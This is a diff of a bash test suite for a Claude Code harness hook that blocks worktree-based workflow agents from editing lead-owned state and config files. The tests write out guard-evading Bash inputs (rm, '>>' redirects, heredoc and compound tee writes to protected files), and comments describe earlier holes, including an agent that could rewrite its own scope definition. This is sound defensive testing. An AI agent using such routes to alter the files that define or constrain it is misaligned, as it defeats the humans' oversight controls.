@@ -146,6 +146,30 @@ run_hook_dashboard() {
   (cd "$1" && printf '%s' "$3" | CLAUDE_PROJECT_DIR="$1" VV_HARNESS_DASHBOARD="${4:-1}" "$1/.claude/hooks/$2")
 }
 
+# OVI-144 Phase 3: enforce-scope.sh arms its lead-owned-state guard
+# STRUCTURALLY -- only when the process runs inside a git worktree, which is
+# what "workflow agent, not lead" means in workflow mode (every parallel agent
+# gets its own worktree; the lead stays in the main checkout, where nothing is
+# restricted). A fixture that needs the guard ARMED therefore needs a real
+# linked worktree, not the retired .claude/teammate-scope.txt file.
+#
+# Creates the fixture repo at $1, adds a worktree at "$1-wt", and installs the
+# hook templates INSIDE the worktree -- install_hooks() writes untracked files,
+# so hooks installed in the main checkout do not come across with the checkout.
+# Callers run the hook against "$1-wt" (armed) and against "$1" (disarmed, the
+# lead's own main checkout) to exercise both directions from one fixture.
+# Branch names are a plain counter rather than the directory's basename: one
+# fixture path deliberately contains shell/glob metacharacters ("root[1]"),
+# which git rejects as a branch name.
+WORKTREE_SEQ=0
+make_worktree_fixture() {
+  make_fixture "$1"
+  WORKTREE_SEQ=$((WORKTREE_SEQ + 1))
+  git -C "$1" worktree add -q -b "wt$WORKTREE_SEQ" "$1-wt" > /dev/null 2>&1
+  install_hooks "$1"
+  install_hooks "$1-wt"
+}
+
 echo "== session-start.sh =="
 
 DIR_A="$WORK/a"
@@ -621,113 +645,68 @@ assert_not_contains "$WARNING_LINE" "F003" \
   "v: F066's status filter genuinely excludes pending, even with a test_file set"
 
 echo ""
-echo "== scope enforcement warning =="
+echo "== scope enforcement warning: retired (OVI-144 Phase 3) =="
 
-DIR_W="$WORK/scope-unarmed"
-make_fixture "$DIR_W"
-mkdir -p "$DIR_W/.claude/hooks"
-printf '#!/bin/bash\nexit 0\n' > "$DIR_W/.claude/hooks/enforce-scope.sh"
-python3 - "$DIR_W/.harness/features.json" <<'PYEOF'
+# The "scope enforcement unarmed" warning retired with OVI-144 Phase 3:
+# enforce-scope.sh arms its lead-owned-state guard structurally (inside a git
+# worktree, i.e. a workflow agent) and .claude/teammate-scope.txt is gone, so
+# there is no unarmed state left to warn about. Each of the three states that
+# used to trigger it -- a teammate in progress with the hook installed and no
+# scope file, a stale scope file left behind by an older harness version, and
+# an empty-string assigned_to (the "!= null, not just truthy" case) -- must
+# now produce no scope-enforcement text at all. The needle is "scope
+# enforcement", not "scope": session-start.sh still prints the next claimable
+# feature's own "(scope: ...)" paths, which is unrelated state.
+set_assigned_to() {
+  python3 - "$1/.harness/features.json" "$2" <<'PYEOF'
 import json
 import sys
 
-path = sys.argv[1]
+path, assigned_to = sys.argv[1], sys.argv[2]
 with open(path) as fh:
     data = json.load(fh)
 for feature in data["features"]:
     if feature["id"] == "F002":
-        feature["assigned_to"] = "api"
+        feature["assigned_to"] = assigned_to
 with open(path, "w") as fh:
     json.dump(data, fh, indent=2)
     fh.write("\n")
 PYEOF
+}
+
+DIR_W="$WORK/scope-warning-no-scope-file"
+make_fixture "$DIR_W"
+mkdir -p "$DIR_W/.claude/hooks"
+printf '#!/bin/bash\nexit 0\n' > "$DIR_W/.claude/hooks/enforce-scope.sh"
+set_assigned_to "$DIR_W" "api"
 OUT=$(run_session_start "$DIR_W" '{"source":"startup"}')
 RC=$?
-assert_rc0 "$RC" "w: unarmed-scope case exits 0"
-assert_contains "$OUT" "scope enforcement unarmed" \
-  "w: warns when a teammate is in-progress, the hook exists, and the scope file is missing"
-assert_contains "$OUT" ".claude/teammate-scope.txt" "w: warning names the missing file"
+assert_rc0 "$RC" "w: a teammate in progress with no scope file exits 0"
+assert_not_contains "$OUT" "scope enforcement" \
+  "w: no scope-enforcement text when a teammate is in progress and no scope file exists"
 
-DIR_W2="$WORK/scope-armed"
+DIR_W2="$WORK/scope-warning-stale-scope-file"
 make_fixture "$DIR_W2"
 mkdir -p "$DIR_W2/.claude/hooks"
 printf '#!/bin/bash\nexit 0\n' > "$DIR_W2/.claude/hooks/enforce-scope.sh"
 printf 'src/hooks/\n' > "$DIR_W2/.claude/teammate-scope.txt"
-python3 - "$DIR_W2/.harness/features.json" <<'PYEOF'
-import json
-import sys
-
-path = sys.argv[1]
-with open(path) as fh:
-    data = json.load(fh)
-for feature in data["features"]:
-    if feature["id"] == "F002":
-        feature["assigned_to"] = "api"
-with open(path, "w") as fh:
-    json.dump(data, fh, indent=2)
-    fh.write("\n")
-PYEOF
+set_assigned_to "$DIR_W2" "api"
 OUT=$(run_session_start "$DIR_W2" '{"source":"startup"}')
 RC=$?
-assert_rc0 "$RC" "w: armed case exits 0"
-assert_not_contains "$OUT" "scope enforcement unarmed" \
-  "w: no warning once the scope file exists"
+assert_rc0 "$RC" "w: a stale scope file left behind exits 0"
+assert_not_contains "$OUT" "scope enforcement" \
+  "w: no scope-enforcement text when a stale scope file is still present"
 
-DIR_W3="$WORK/scope-lead-only"
-make_fixture "$DIR_W3"
-mkdir -p "$DIR_W3/.claude/hooks"
-printf '#!/bin/bash\nexit 0\n' > "$DIR_W3/.claude/hooks/enforce-scope.sh"
-OUT=$(run_session_start "$DIR_W3" '{"source":"startup"}')
-RC=$?
-assert_rc0 "$RC" "w: lead-only case exits 0"
-assert_not_contains "$OUT" "scope enforcement unarmed" \
-  "w: no warning when no feature has assigned_to set"
-
-DIR_W4="$WORK/scope-no-hook"
-make_fixture "$DIR_W4"
-python3 - "$DIR_W4/.harness/features.json" <<'PYEOF'
-import json
-import sys
-
-path = sys.argv[1]
-with open(path) as fh:
-    data = json.load(fh)
-for feature in data["features"]:
-    if feature["id"] == "F002":
-        feature["assigned_to"] = "api"
-with open(path, "w") as fh:
-    json.dump(data, fh, indent=2)
-    fh.write("\n")
-PYEOF
-OUT=$(run_session_start "$DIR_W4" '{"source":"startup"}')
-RC=$?
-assert_rc0 "$RC" "w: hook-absent case exits 0"
-assert_not_contains "$OUT" "scope enforcement unarmed" \
-  "w: no warning when enforce-scope.sh itself is not installed"
-
-DIR_W5="$WORK/scope-empty-string-assigned"
+DIR_W5="$WORK/scope-warning-empty-string-assigned"
 make_fixture "$DIR_W5"
 mkdir -p "$DIR_W5/.claude/hooks"
 printf '#!/bin/bash\nexit 0\n' > "$DIR_W5/.claude/hooks/enforce-scope.sh"
-python3 - "$DIR_W5/.harness/features.json" <<'PYEOF'
-import json
-import sys
-
-path = sys.argv[1]
-with open(path) as fh:
-    data = json.load(fh)
-for feature in data["features"]:
-    if feature["id"] == "F002":
-        feature["assigned_to"] = ""
-with open(path, "w") as fh:
-    json.dump(data, fh, indent=2)
-    fh.write("\n")
-PYEOF
+set_assigned_to "$DIR_W5" ""
 OUT=$(run_session_start "$DIR_W5" '{"source":"startup"}')
 RC=$?
 assert_rc0 "$RC" "w: empty-string assigned_to case exits 0"
-assert_contains "$OUT" "scope enforcement unarmed" \
-  "w: warns on an empty-string assigned_to too (spec says != null, not just truthy)"
+assert_not_contains "$OUT" "scope enforcement" \
+  "w: no scope-enforcement text for an empty-string assigned_to either"
 
 # F014: session_id is surfaced in the orientation so the lead can name its MLD entry
 # after it, but the hook must never mention .harness/mld/ itself (see the non-injection
@@ -2224,8 +2203,13 @@ else
   fail "z: transcript-secrets rule missing in templates/CLAUDE.md"
 fi
 
+# --exclude-dir=worktrees on both repo-wide counts below: a live workflow
+# session checks its agents out into .claude/worktrees/<name>/, each a full
+# second copy of every *.md in the repo, which otherwise inflates these
+# single-occurrence counts and fails the suite for a reason that has nothing
+# to do with the content being counted.
 FULL_EXAMPLE_COUNT=$(grep -r '"correction_cycles": 0' "$REPO_ROOT" --include="*.md" \
-  | wc -l | tr -d ' ')
+  --exclude-dir=worktrees | wc -l | tr -d ' ')
 if [ "$FULL_EXAMPLE_COUNT" -eq 1 ]; then
   pass "z: the full 16-field feature JSON example appears exactly once across *.md"
 else
@@ -2233,7 +2217,7 @@ else
 fi
 
 DONE_DEF_COUNT=$(grep -r "Feature is not done until" "$REPO_ROOT" --include="*.md" \
-  | wc -l | tr -d ' ')
+  --exclude-dir=worktrees | wc -l | tr -d ' ')
 if [ "$DONE_DEF_COUNT" -eq 1 ]; then
   pass "z: the done-definition sentence appears exactly once across *.md"
 else
@@ -2307,42 +2291,6 @@ else
   fail "ht: this repo's installed statusline.sh has drifted from the plugin's own copy (F047) -- re-copy it"
 fi
 
-DIR_HS="$WORK/ht-scope"
-make_fixture "$DIR_HS"
-install_hooks "$DIR_HS"
-mkdir -p "$DIR_HS/sub"
-IN_SCOPE_JSON="{\"tool_input\":{\"file_path\":\"$DIR_HS/src/parser/x.py\"}}"
-OUT_SCOPE_JSON="{\"tool_input\":{\"file_path\":\"$DIR_HS/src/other/y.py\"}}"
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$IN_SCOPE_JSON")
-RC=$?
-assert_rc0 "$RC" "ht: enforce-scope allows edits when no scope file exists"
-printf 'src/parser/\n' > "$DIR_HS/.claude/teammate-scope.txt"
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$IN_SCOPE_JSON")
-RC=$?
-assert_rc0 "$RC" "ht: enforce-scope allows an in-scope edit"
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$OUT_SCOPE_JSON" 2>&1)
-RC=$?
-assert_rc2 "$RC" "ht: enforce-scope blocks an out-of-scope edit"
-assert_contains "$OUT" "src/other/y.py" "ht: block message names the file"
-assert_contains "$OUT" "scope expansion" "ht: block message names the scope-expansion repair"
-
-# F053: Claude Code discards a hook's stdout entirely on exit 2 and feeds
-# only stderr back to the blocked agent -- the identical defect F046 fixed
-# in check-remaining-tasks.sh.template. Pin the mechanism directly: stdout
-# alone must be empty, stderr alone must carry the block message.
-STDOUT_ONLY=$(run_hook "$DIR_HS" enforce-scope.sh "$OUT_SCOPE_JSON" 2>/dev/null)
-assert_empty "$STDOUT_ONLY" "ht (F053): out-of-scope block writes nothing to stdout"
-STDERR_ONLY=$(run_hook "$DIR_HS" enforce-scope.sh "$OUT_SCOPE_JSON" 2>&1 1>/dev/null)
-assert_contains "$STDERR_ONLY" "src/other/y.py" \
-  "ht (F053): out-of-scope block message is on stderr specifically"
-
-OUT=$(run_hook_from_subdir "$DIR_HS" enforce-scope.sh "$OUT_SCOPE_JSON" 2>&1)
-RC=$?
-assert_rc2 "$RC" "ht: enforce-scope still blocks when cwd is a subdirectory"
-
-echo ""
-echo "== state ownership + bash write boundary =="
-
 bash_command_json() {
   python3 -c "
 import json
@@ -2363,7 +2311,62 @@ assert_deny_json() {
   assert_contains "$1" '"permissionDecision": "deny"' "$2"
 }
 
-# DIR_HS already has hooks installed and a scope file ("src/parser/") from the block above.
+# OVI-144 Phase 3: per-pattern scope matching (and .claude/teammate-scope.txt
+# with it) retired -- a workflow agent's file boundary is now physical, its own
+# git worktree, so the only gate left here is the lead-owned-state-file guard,
+# armed by that same worktree. DIR_HS is the WORKTREE (armed, "workflow agent");
+# DIR_HS_MAIN is the main checkout of the same repo (disarmed, "the lead").
+DIR_HS_MAIN="$WORK/ht-scope"
+make_worktree_fixture "$DIR_HS_MAIN"
+DIR_HS="$DIR_HS_MAIN-wt"
+mkdir -p "$DIR_HS/sub"
+ORDINARY_JSON="{\"tool_input\":{\"file_path\":\"$DIR_HS/src/parser/x.py\"}}"
+LEAD_OWNED_JSON="{\"tool_input\":{\"file_path\":\"$DIR_HS/.harness/features.json\"}}"
+OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$ORDINARY_JSON")
+RC=$?
+assert_rc0 "$RC" "ht: enforce-scope allows an ordinary edit inside a worktree"
+assert_not_contains "$OUT" "permissionDecision" "ht: an ordinary edit has no deny fields"
+OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$LEAD_OWNED_JSON")
+RC=$?
+assert_rc0 "$RC" "ht: a lead-owned edit inside a worktree exits 0 (JSON deny)"
+assert_deny_json "$OUT" "ht: the worktree arms the lead-owned guard"
+
+# The disarmed direction, from the SAME repo: in the main checkout (the lead's
+# own session) the identical Edit is allowed, since git-dir and git-common-dir
+# are the same path there.
+OUT=$(run_hook "$DIR_HS_MAIN" enforce-scope.sh \
+  "$(edit_json "$DIR_HS_MAIN/.harness/features.json")")
+RC=$?
+assert_rc0 "$RC" "ht: the same lead-owned edit in the main checkout exits 0"
+assert_not_contains "$OUT" "permissionDecision" \
+  "ht: a main checkout leaves the lead-owned guard unarmed (no deny fields)"
+
+# Fail-open on environment failure: outside a git repository altogether, the
+# worktree comparison can't be made at all, and this hook's documented posture
+# is to allow rather than block (see enforce-scope.sh's own header).
+DIR_HS_NOGIT="$WORK/ht-scope-nogit"
+mkdir -p "$DIR_HS_NOGIT/.harness"
+install_hooks "$DIR_HS_NOGIT"
+OUT=$(run_hook "$DIR_HS_NOGIT" enforce-scope.sh \
+  "$(edit_json "$DIR_HS_NOGIT/.harness/features.json")")
+RC=$?
+assert_rc0 "$RC" "ht: a non-git directory exits 0 (fail-open, not blocked)"
+assert_not_contains "$OUT" "permissionDecision" \
+  "ht: a non-git directory leaves the guard unarmed (no deny fields)"
+
+# Arming is decided AFTER the cd to the project root, so a hook invoked from a
+# subdirectory of the worktree must still arm -- git prints git-dir and
+# git-common-dir in different relative forms from a subdirectory, which would
+# false-arm (or fail to arm) a comparison made anywhere but the root.
+OUT=$(run_hook_from_subdir "$DIR_HS" enforce-scope.sh "$LEAD_OWNED_JSON")
+RC=$?
+assert_rc0 "$RC" "ht: enforce-scope still denies when cwd is a subdirectory"
+assert_deny_json "$OUT" "ht: subdirectory invocation still arms the lead-owned guard"
+
+echo ""
+echo "== state ownership + bash write boundary =="
+
+# DIR_HS (the armed worktree) and its helpers come from the block above.
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(edit_json "$DIR_HS/.harness/features.json")")
 RC=$?
@@ -2374,7 +2377,7 @@ assert_contains "$OUT" "verified live" "hs2: denial reason carries a verified-li
 assert_contains "$OUT" "on Claude Code" "hs2: annotation names the Claude Code version"
 assert_contains "$OUT" "lead-owned" \
   "hg: lead-owned Edit denial names the violated invariant (F005/OVI-61)"
-assert_contains "$OUT" "SendMessage" \
+assert_contains "$OUT" "report the needed change in your final result" \
   "hg: lead-owned Edit denial names the repair (F005/OVI-61)"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'echo x >> .harness/features.json')")
@@ -2382,19 +2385,17 @@ RC=$?
 assert_rc0 "$RC" "hs2: Bash write to a lead-owned state file exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: Bash lead-owned write denial uses JSON deny form"
 
-# F058: .harness/harness.json was NOT in LEAD_OWNED before this fix -- it was
-# protected only by the ordinary scope check, so a teammate scoped to .harness/
-# itself (unlike DIR_HS above, whose scope is src/parser/ and would deny
-# harness.json anyway as merely out-of-scope, which wouldn't discriminate this
-# fix from ordinary scope enforcement) could edit it directly. This fixture's
-# scope deliberately covers .harness/ so the LEAD_OWNED override is the ONLY
-# thing that can produce a deny here -- confirmed live before the fix that both
-# a Write and a Bash redirect to harness.json under this exact scope returned
-# ALLOW (rc 0, no deny JSON), unlike features.json's genuine denial.
-DIR_HL="$WORK/ht-harness-json-lead-owned"
-make_fixture "$DIR_HL"
-install_hooks "$DIR_HL"
-printf '.harness/\n' > "$DIR_HL/.claude/teammate-scope.txt"
+# F058: .harness/harness.json holds git identity config, prep/stamp config and
+# (as of F054) commit-gate.sh's secret-scan exemption list -- security-relevant
+# configuration a workflow agent must not edit unilaterally, which is why it
+# sits in LEAD_OWNED next to features.json/context_summary.md/claude-progress.txt
+# rather than being left to ordinary file rules. Its own armed fixture (a
+# worktree of a separate repo) keeps every ordinary .harness/ file around it
+# available for the allow-direction assertions below, so LEAD_OWNED membership
+# is the only thing that can produce a deny here.
+DIR_HL_MAIN="$WORK/ht-harness-json-lead-owned"
+make_worktree_fixture "$DIR_HL_MAIN"
+DIR_HL="$DIR_HL_MAIN-wt"
 
 OUT=$(run_hook "$DIR_HL" enforce-scope.sh "$(edit_json "$DIR_HL/.harness/harness.json")")
 RC=$?
@@ -2407,23 +2408,23 @@ RC=$?
 assert_rc0 "$RC" "hs2 (F058): Bash write to harness.json exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F058): harness.json Bash write denial uses JSON deny form"
 
-# No new false positive: an ordinary in-scope .harness/ file must still be
+# No new false positive: an ordinary .harness/ file must still be
 # allowed cleanly -- the fix targets harness.json specifically, not the whole
 # directory.
 OUT=$(run_hook "$DIR_HL" enforce-scope.sh "$(edit_json "$DIR_HL/.harness/some-other-file.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F058): an ordinary in-scope .harness/ file still passes, rc 0"
+assert_rc0 "$RC" "hs2 (F058): an ordinary .harness/ file still passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F058): ordinary in-scope .harness/ file has no deny fields"
+  "hs2 (F058): ordinary .harness/ file has no deny fields"
 
 # F062: .harness/mld/ is documented lead-only (skills/harness-continue/SKILL.md:
 # "the lead -- never a teammate -- writes .harness/mld/YYYY-MM-DD-<session-id>.md")
 # but was unprotected before this fix -- confirmed live that a teammate scoped to
 # .harness/ gets ALLOW on a Write here. The FIRST prefix-style LEAD_OWNED entry:
 # mld files are dated/session-named, not a fixed path, so exact-set membership
-# (every prior LEAD_OWNED entry) can't express it. Reuses DIR_HL (scope=.harness/)
-# so the LEAD_OWNED override is the ONLY thing that can produce a deny here, the
-# same discriminating-fixture reasoning as F058's own use of this fixture.
+# (every prior LEAD_OWNED entry) can't express it. Reuses DIR_HL (its own armed
+# worktree) so LEAD_OWNED membership is the ONLY thing that can produce a deny
+# here, the same discriminating-fixture reasoning as F058's own use of it.
 OUT=$(run_hook "$DIR_HL" enforce-scope.sh "$(edit_json "$DIR_HL/.harness/mld/2026-07-31-abc12345.md")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F062): Edit to .harness/mld/ exits 0 (JSON deny, not exit 2)"
@@ -2443,7 +2444,7 @@ OUT=$(run_hook "$DIR_HL" enforce-scope.sh "$(edit_json "$DIR_HL/.harness/mld/som
 RC=$?
 assert_deny_json "$OUT" "hs2 (F062): .harness/mld/ denial applies to any filename under the prefix, not just one example"
 
-# No new false positive: an ordinary in-scope .harness/ file (including one
+# No new false positive: an ordinary .harness/ file (including one
 # that merely starts with "mld" as a substring, not the real directory) must
 # still be allowed cleanly -- the fix targets the .harness/mld/ PREFIX, not
 # any path containing those characters.
@@ -2474,66 +2475,42 @@ assert_rc0 "$RC" "hs2 (F062): Bash write to an mld-lookalike file still passes, 
 assert_not_contains "$OUT" "permissionDecision" \
   "hs2 (F062): Bash-path mld-lookalike has no deny fields (prefix, not substring)"
 
-# F060: .claude/teammate-scope.txt was NOT in LEAD_OWNED before this fix -- a
-# teammate scoped to .claude/ could edit its OWN scope definition directly
-# (confirmed live before the fix: both a Write and a Bash redirect to it
-# returned ALLOW under a .claude/ scope), a strictly larger hole than F058's
-# harness.json gap since the edit takes effect on the teammate's very next
-# tool call in the same session. A fresh fixture with scope=.claude/ makes the
-# LEAD_OWNED override the ONLY thing that can produce a deny here, the same
-# discriminating-fixture reasoning as DIR_HL above.
-DIR_HC="$WORK/ht-teammate-scope-lead-owned"
-make_fixture "$DIR_HC"
-install_hooks "$DIR_HC"
-printf '.claude/\n' > "$DIR_HC/.claude/teammate-scope.txt"
-
-OUT=$(run_hook "$DIR_HC" enforce-scope.sh "$(edit_json "$DIR_HC/.claude/teammate-scope.txt")")
+# F060 protected .claude/teammate-scope.txt as lead-owned state, so a teammate
+# could not rewrite its own scope definition. Retired with OVI-144 Phase 3: the
+# file itself is gone and a workflow agent's boundary is its worktree, which no
+# file it can write moves. What survives from that cluster is the narrowness of
+# the guard -- .claude/ as a whole was deliberately never lead-owned, since
+# hook-development work legitimately writes there -- so those two assertions
+# move onto the armed fixture above.
+OUT=$(run_hook "$DIR_HL" enforce-scope.sh "$(edit_json "$DIR_HL/.claude/hooks/enforce-scope.sh")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F060): Edit to teammate-scope.txt exits 0 (JSON deny, not exit 2)"
-assert_deny_json "$OUT" "hs2 (F060): teammate-scope.txt Edit denial uses the JSON deny form"
-assert_contains "$OUT" "lead-owned" "hs2 (F060): teammate-scope.txt Edit denial names the invariant"
-
-OUT=$(run_hook "$DIR_HC" enforce-scope.sh \
-  "$(bash_command_json 'echo ".claude/" > .claude/teammate-scope.txt')")
-RC=$?
-assert_rc0 "$RC" "hs2 (F060): Bash write to teammate-scope.txt exits 0 (JSON deny)"
-assert_deny_json "$OUT" "hs2 (F060): teammate-scope.txt Bash write denial uses JSON deny form"
-
-# No new false positive: a teammate explicitly assigned .claude/hooks/ (or any
-# other ordinary in-scope .claude/ file) must still be able to work on it --
-# this fix deliberately protects ONLY teammate-scope.txt, not the hooks
-# themselves or the whole .claude/ directory (F060's own filing: making the
-# hooks unconditionally lead-owned would block legitimate hook-development
-# work, which this repo's own sweep does routinely).
-OUT=$(run_hook "$DIR_HC" enforce-scope.sh "$(edit_json "$DIR_HC/.claude/hooks/enforce-scope.sh")")
-RC=$?
-assert_rc0 "$RC" "hs2 (F060): an in-scope .claude/hooks/ file still passes, rc 0"
+assert_rc0 "$RC" "hs2: an ordinary .claude/hooks/ file still passes under arming, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F060): in-scope .claude/hooks/ file has no deny fields (hooks stay ordinary-scope-governed)"
+  "hs2: ordinary .claude/hooks/ file has no deny fields (hooks are not lead-owned)"
 
-OUT=$(run_hook "$DIR_HC" enforce-scope.sh "$(edit_json "$DIR_HC/.claude/some-other-file.txt")")
+OUT=$(run_hook "$DIR_HL" enforce-scope.sh "$(edit_json "$DIR_HL/.claude/some-other-file.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F060): an ordinary in-scope .claude/ file still passes, rc 0"
+assert_rc0 "$RC" "hs2: an ordinary .claude/ file still passes under arming, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F060): ordinary in-scope .claude/ file has no deny fields"
+  "hs2: ordinary .claude/ file has no deny fields"
 
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'tee src/other/escaped.txt')")
+OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'tee .harness/mld/escaped.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: Bash tee to an out-of-scope target exits 0 (JSON deny)"
-assert_deny_json "$OUT" "hs2: out-of-scope tee denial uses JSON deny form"
-assert_contains "$OUT" "outside your assigned scope" \
-  "hg: out-of-scope tee denial names the invariant (F005/OVI-61)"
+assert_rc0 "$RC" "hs2: Bash tee to a lead-owned target exits 0 (JSON deny)"
+assert_deny_json "$OUT" "hs2: lead-owned tee denial uses JSON deny form"
+assert_contains "$OUT" "lead-owned" \
+  "hg: lead-owned tee denial names the invariant (F005/OVI-61)"
 
-HEREDOC_CMD=$'cat <<\'EOF\' > src/other/escaped.txt\ncontent\nEOF'
+HEREDOC_CMD=$'cat <<\'EOF\' > .harness/mld/escaped.txt\ncontent\nEOF'
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json "$HEREDOC_CMD")")
 RC=$?
-assert_rc0 "$RC" "hs2: heredoc-into-redirect to an out-of-scope target exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: heredoc-into-redirect to a lead-owned target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: heredoc-into-redirect denial uses JSON deny form"
 
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'rm src/other/file.py')")
+OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'rm .harness/mld/file.py')")
 RC=$?
-assert_rc0 "$RC" "hs2: Bash rm on an out-of-scope target exits 0 (JSON deny)"
-assert_deny_json "$OUT" "hs2: out-of-scope rm denial uses JSON deny form"
+assert_rc0 "$RC" "hs2: Bash rm under the lead-owned mld prefix exits 0 (JSON deny)"
+assert_deny_json "$OUT" "hs2: lead-owned-prefix rm denial uses JSON deny form"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'rm .harness/features.json')")
 RC=$?
@@ -2541,17 +2518,18 @@ assert_rc0 "$RC" "hs2: Bash rm on a lead-owned state file exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: lead-owned rm denial uses JSON deny form"
 assert_contains "$OUT" "lead-owned" \
   "hg: lead-owned rm denial names the violated invariant (F005/OVI-61)"
-assert_contains "$OUT" "SendMessage" \
+assert_contains "$OUT" "report the needed change in your final result" \
   "hg: lead-owned rm denial names the repair (F005/OVI-61)"
 
-# Hostile case (F005/OVI-61): Bash '>>' redirect specifically out of scope, distinct
-# from the lead-owned '>>' case above (which targets .harness/features.json).
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'echo x >> src/other/out.txt')")
+# Hostile case (F005/OVI-61): a Bash '>>' redirect reaching the lead-owned set
+# through the .harness/mld/ PREFIX, distinct from the '>>' case above (which
+# targets .harness/features.json by exact match).
+OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'echo x >> .harness/mld/out.txt')")
 RC=$?
-assert_rc0 "$RC" "hg: Bash >> redirect outside scope exits 0 (JSON deny)"
-assert_deny_json "$OUT" "hg: out-of-scope >> redirect denial uses JSON deny form"
-assert_contains "$OUT" "outside your assigned scope" \
-  "hg: out-of-scope >> redirect denial names the invariant"
+assert_rc0 "$RC" "hg: Bash >> redirect to a lead-owned target exits 0 (JSON deny)"
+assert_deny_json "$OUT" "hg: lead-owned >> redirect denial uses JSON deny form"
+assert_contains "$OUT" "lead-owned" \
+  "hg: lead-owned >> redirect denial names the invariant"
 
 # F005/OVI-61 scope note: the commit-content gate (compound `git add && git commit`,
 # secret-shaped staged addition) has no hook yet -- F011/OVI-64 is still pending.
@@ -2567,64 +2545,66 @@ assert_not_contains "$OUT" "permissionDecision" "hs2: git status has no deny fie
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'cp src/parser/a.py src/parser/b.py')")
 RC=$?
-assert_rc0 "$RC" "hs2: in-scope Bash cp passes through, rc 0"
-assert_not_contains "$OUT" "permissionDecision" "hs2: in-scope cp has no deny fields"
+assert_rc0 "$RC" "hs2: ordinary Bash cp passes through, rc 0"
+assert_not_contains "$OUT" "permissionDecision" "hs2: ordinary cp has no deny fields"
 
 # Regression: a '>' inside a quoted string before the real redirect must not be
 # mistaken for the redirect target (found in review: first-match regex denied
-# legitimate in-scope writes containing markup/arrows/blockquotes).
+# legitimate ordinary writes containing markup/arrows/blockquotes).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'echo "a => b" > src/parser/map.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: an in-scope redirect after a quoted '>' passes through, rc 0"
+assert_rc0 "$RC" "hs2: an ordinary redirect after a quoted '>' passes through, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2: quoted-'>' in-scope redirect has no deny fields"
+  "hs2: quoted-'>' ordinary redirect has no deny fields"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'rm src/parser/tmp.py')")
 RC=$?
-assert_rc0 "$RC" "hs2: in-scope Bash rm passes through, rc 0"
-assert_not_contains "$OUT" "permissionDecision" "hs2: in-scope rm has no deny fields"
+assert_rc0 "$RC" "hs2: ordinary Bash rm passes through, rc 0"
+assert_not_contains "$OUT" "permissionDecision" "hs2: ordinary rm has no deny fields"
 
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'cd /tmp && tee src/other/out.txt')")
+OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'cd /tmp && tee .harness/mld/out.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: a compound command's out-of-scope segment is still denied"
+assert_rc0 "$RC" "hs2: a compound command's lead-owned segment is still denied"
 assert_deny_json "$OUT" "hs2: compound-command denial uses JSON deny form"
 
+# The lead's own context: a plain main checkout, never a worktree, so the guard
+# stays unarmed and every write -- including the lead-owned state files the lead
+# is the one meant to maintain -- is allowed through both the Edit/Write and the
+# Bash path.
 DIR_HS_LEAD="$WORK/hs2-lead-context"
 make_fixture "$DIR_HS_LEAD"
 install_hooks "$DIR_HS_LEAD"
 OUT=$(run_hook "$DIR_HS_LEAD" enforce-scope.sh "$(edit_json "$DIR_HS_LEAD/.harness/features.json")")
 RC=$?
-assert_rc0 "$RC" "hs2: lead context (no scope file) allows Edit to a state file"
+assert_rc0 "$RC" "hs2: lead context (main checkout) allows Edit to a state file"
 assert_not_contains "$OUT" "permissionDecision" "hs2: lead-context Edit has no deny fields"
 OUT=$(run_hook "$DIR_HS_LEAD" enforce-scope.sh "$(bash_command_json 'rm .harness/features.json')")
 RC=$?
-assert_rc0 "$RC" "hs2: lead context (no scope file) allows Bash rm on a state file"
+assert_rc0 "$RC" "hs2: lead context (main checkout) allows Bash rm on a state file"
 assert_not_contains "$OUT" "permissionDecision" "hs2: lead-context Bash rm has no deny fields"
 OUT=$(run_hook "$DIR_HS_LEAD" enforce-scope.sh "$(bash_command_json 'tee src/anywhere/out.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: lead context (no scope file) allows an unscoped Bash tee"
+assert_rc0 "$RC" "hs2: lead context (main checkout) allows an ordinary Bash tee"
 assert_not_contains "$OUT" "permissionDecision" "hs2: lead-context tee has no deny fields"
 
 # F023: segments_of() split on \|\||&&|[|;] -- missing a literal newline and "&".
 # commit-gate.sh.template hit exactly this bug (F011/OVI-64, round 3) and fixed
 # it; enforce-scope.sh never did. Both missing separators let two writes glue
 # into one segment; redirect_target() then returns only the LAST >/>> match on
